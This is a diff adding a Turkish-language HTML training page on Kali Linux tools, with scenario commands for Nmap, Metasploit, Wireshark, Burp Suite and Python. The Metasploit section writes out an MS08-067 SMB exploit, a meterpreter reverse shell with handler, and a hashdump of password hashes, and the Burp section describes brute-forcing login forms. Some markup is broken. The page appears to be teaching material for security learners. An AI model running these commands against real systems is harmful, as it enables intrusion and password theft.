@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Kali Linux Siber Güvenlik Eğitimleri - Detaylı Senaryolu Örnekler</title>
+    <style>
+        body {
+            font-family: 'Inter', 'Segoe UI', sans-serif;
+            background-color: #0f172a;
+            color: #a8d5ba;
+            margin: 0;
+            display: flex;
+        }
+
+        aside {
+            width: 250px;
+            background: #1a2332;
+            padding: 20px;
+            height: 100vh;
+            position: sticky;
+            top: 0;
+        }
+
+        main {
+            flex-grow: 1;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        h2,
+        h3 {
+            color: #37a960;
+        }
+
+        .section {
+            margin-bottom: 40px;
+        }
+
+        .card {
+            background: #1e293b;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 10px;
+        }
+
+        pre {
+            background: #2a482c;
+            padding: 10px;
+            border-radius: 8px;
+            overflow-x: auto;
+        }
+
+        button {
+            padding: 10px 15px;
+            border: none;
+            border-radius: 8px;
+            margin: 5px;
+            background: #10b981;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        button.secondary {
+            background: #334155;
+        }
+    </style>
+</head>
+
+<body>
+    <aside>
+        <h2>Modüller</h2>
+        <div class="nav-item" data-target="nmap">Nmap - Ağ Tarama</div>
+        <div class="nav-item" data-target="metasploit">Metasploit - Exploit</div>
+        <div class="nav-item" data-target="wireshark">Wireshark - Trafik Analizi</div>
+        <div class="nav-item" data-target="burp">Burp Suite - Web Güvenliği</div>
+        <div class="nav-item" data-target="python">Python Otomasyon</div>
+    </aside>
+    <main>
+        <div id="nmap" class="section active">
+            <h2>1. Nmap ile Ağ ve Güvenlik Taraması - Senaryolar</h2>
+            <div class="card">
+                <h3>Kolay (Senaryo: Ofis Cihazları Tespiti)</h3>
+                <p>Ofisiniz ağındaki hangi cihazların aktif olduğunu ve IP adreslerini öğrenin.</p>
+                <pre>nmap -sn 192.168.1.0/24</pre>
+            </div>
+            <div class="card">
+                <h3>Orta (Senaryo: Web Sunucusu Port ve Servis Taraması)</h3>
+                <p>Şirket ağına bağlı web sunucusundaki aktif portları ve çalışan servisleri detaylı inceleyin.</p>
+                <pre>nmap -sV -p 22,80,443 192.168.1.10</pre>
+                <p><strong>Açıklama:</strong> Port 22 (SSH), 80 (HTTP) ve 443 (HTTPS) üzerinde çalışan servislerin
+                    versiyonlarını öğrenip potansiyel açıklıklara karşı araştırma yapabilirsiniz.</p>
+            </div>
+            <div class="card">
+                <h3>Zor (Senaryo: Güvenlik Duvarı Bypass ve Script Tarama)</h3>
+                <p>Hedef sistemde güvenlik duvarı var ve çeşitli güvenlik açıklarını otomatik scriptlerle sorgulamak
+                    istiyorsunuz.</p>
+                <pre>nmap -sS -sC -sV 192.168.1.10</pre>
+                <p><strong>Açıklama:</strong> SYN taraması (-sS) ile gizli tarama yapılır, script taraması (-sC) temek
+                    güvenlik testleri uygular ve servis versiyonu (-sV) bilgisi verir.</p>
+            </div>
+            <div class="card">
+                <h3>Uzman (Senaryo: Ağ Haritalaması ve Derinlemesine Güvenlik Analizi)</h3>
+                <p>Ağdaki tüm cihazları haritalayın, OS tespiti yapın, güvenlik açıklarını derinlemesine tarayın.</p>
+                <pre>nmap -A -p- 192.168.1.0/24</pre>
+                <p><strong>Açıklama:</strong> Tüm portlar (-p-), detaylı OS ve servis tespiti (-A) ile geniş kapsamlı
+                    tarama yapılır.</p>
+            </div>
+        </div>
+        <div id="metasploit" class="section" style="display:none;">
+            <h2>2. Metasploit ile Sızma Testi - Senaryolar</h2>
+            <div class="card">
+                <h3>Kolay (Senaryo: Basit SMB Exploit)</h3>
+                <p>Bilinen SMB açığını kullanarak hedef sisteme sızmayı deneyin.</p>
+                <pre>msfconsole use exploit/windows/smb/ms08_067_netapi set RHOST 192.168.1.105 run</pre>
+            </div>
+            <div class="card">
+                <h3>Orta (Senaryo: Meterpreter Ters Bağlantı Kurma)</h3>
+                <p>Hedefte meterpreter shell açmak için bağlantı bilgilerini ayarlayın.</p>
+                <pre>set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 192.168.1.100 exploit</pre>
+            </div>
+            <div class="card">
+                <h3>Zor (Senaryo: Multi-handler ile Çoklu Bağlantı Yönetimi)</h3>
+                <p>Birden fazla meterpreter bağlantısını yakalayarak yönetin.</p>
+                <pre>use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 192.168.1.100 exploit</pre>
+            </div>
+            <div class="card">
+                <h3>Uzman (Senaryo: Post-Exploit Bilgi Toplama)</h3>
+                <p>Ele geçirilen sistemde parola hashlerine ve yönetici yetkilerine erişim için modüller çalıştırın.</p>
+                <pre>run post/windows/gather/hashdump run post/windows/manage/priv</pre>
+            </div>
+        </div>
+        <div id="wireshark" class="section" style="display:none;">
+            <h2>3. Wireshark ile Ağ Trafik Analizi - Senaryolar</h2>
+            <div class="card">
+                <h3>Kolay (Senaryo: Temel Paket Yakalama)</h3>
+                <p>Ağ arayüzünüzden geçen tüm paketleri yakalayın ve analiz etmeye başlayın.</p>
+                <pre>wireshark</pre>
+            </div>
+            <div class="card">
+                <h3>Orta (Senaryo: HTTP Trafik Filtreleme ve İnceleme)</h3>
+                <p>[Wireshark](pplx://action/translate) içindeki HTTP isteklerini filtreleyerek kullanıcı aktivitelerini
+                    analiz edin. Gerçek dünyada web uygulamalarında potansiyel SQL enjeksiyon ve XSS tespiti için trafik
+                    kayıtlarını inceleyin.</p>
+                <pre>http && ip.addr == 192.168.1.100</pre>
+                <p><strong>Açıklama:</strong> Bu filtre belirli bir IP adresi ile yapılan tüm HTTP trafiğini gösterir.
+                    Trafikteki GET/POST isteklerini inceleyerek saldırı işaretleri arayabilirsiniz.</p>
+            </div>
+            <div class="card">
+                <h3>Zor (Senaryo: TCP Üç Yönlü El Sıkışma İzleme)</h3>
+                <p>Bir TCP bağlantısının kurulma aşamasındaki SYN/ACK paketlerini takip ederek bağlantı sorunlarını
+                    analiz edin.</p>
+                <pre>tcp.flags.syn==1 and tcp.flags.ack==0</pre>
+            </div>
+            <div class="card">
+                <h3>Uzman (Senaryo: Yeniden Gönderim ve Ağ Performans Sorunları)</h3>
+                <p>Ağda gecikme ve paket kaybını tespit etmek için yeniden gönderilen paketleri filtreleyin ve analiz
+                    edin.</p>
+                <pre>tcp.analysis.retransmission</pre>
+            </div>
+        </div>
+        <div id="burp" class="section" style="display:none;">
+            <h2>4. Burp Suite ile Web Uygulama Güvenliği - Senaryolar</h2>
+            <div class="card">
+                <h3>Kolay (Senaryo: Proxy ile Manuel HTTP Trafiği Yakalama)</h3>
+                <p>Tarayıcınız ile web uygulaması arasındaki tüm HTTP(S) trafiğini yakalayarak inceleyin.</p>
+                <pre>Proxy > Intercept > On</pre>
+            </div>
+            <div class="card">
+                <h3>Orta (Senaryo: Otomatik Güvenlik Tarayıcı Kullanımı)</h3>
+                <p>Burp Suite'in aktif tarama özelliği ile web uygulamasındaki yaygın güvenlik açıklarını tespit edin.
+                </p>
+                <pre>Scanner > Active Scan</pre>
+            </div>
+            <div class="card">
+                <h3>Zor (Senaryo: Brute Force Saldırısı ve Parametre Testi)</h3>
+                <p>Intruder modülünü kullanarak giriş formuna kelime listesiyle saldırı uygulayın.</p>
+                <pre>Intruder > Positions: parametre seç > Payloads: kelime listesi ile deneme</pre>
+            </div>
+            <div class="card">
+                <h3>Uzman (Senaryo: Kendi Eklentinizi Yazma ve Testleri Otomatikleştirme)</h3>
+                <p>Burp Suite için Java tabanlı özel eklenti geliştirin ve test süreçlerinizi otomatikleştirin.</p>
+            </div>
+        </div>
+        <div id="python" class="section" style="display:none;">
+            <h2>5. Python ile Otomasyon - Senaryolar</h2>
+            <div class="card">
+                <h3>Kolay (Senaryo: Basit Nmap Tarama Komutu)</h3>
+                <pre>odede>import os os.system("nmap -sn 192.168.1.0/24") </code></pre>
+            </div>
+            <div class="card">
+                <h3>Orta (Senaryo: Fonksiyon Tanımlama ve Tek IP Tarama)</h3>
+                <pre><code>import os def nmap_tarama(ip): os.system(f"nmap -sV {ip}") nmap_tarama("192.168.1.50") </code></pre>
+            </div>
+            <div class="card">
+                <h3>Zor (Senaryo: Çoklu IP Tarama Döngüsü)</h3>
+                <pre><code>import os ips = ["192.168.1.50", "192.168.1.51", "192.168.1.52"] for ip in ips: nmap_tarama(ip) </code></pre>
+            </div>
+            <div class="card">
+                <h3>Uzman (Senaryo: Tarama Sonuçlarını Dosyaya Kaydetme)</h3>
+                <pre><code>import os def nmap_kaydet(ip, dosya): os.system(f"nmap -sV {ip} -oN {dosya}") nmap_kaydet("192.168.1.50", "scan_result.txt") </code></pre>
+            </div>
+        </div>
+    </main>
+    <script> const navItems = document.querySelectorAll('.nav-item'); const sections = document.querySelectorAll('.section'); navItems.forEach(item => { item.addEventListener('click', () => { navItems.forEach(i => i.classList.remove('active')); sections.forEach(s => s.style.display = 'none'); const target = item.getAttribute('data-target'); document.getElementById(target).style.display = 'block'; item.classList.add('active'); }); }); </script>
+</body>
+
+</html>
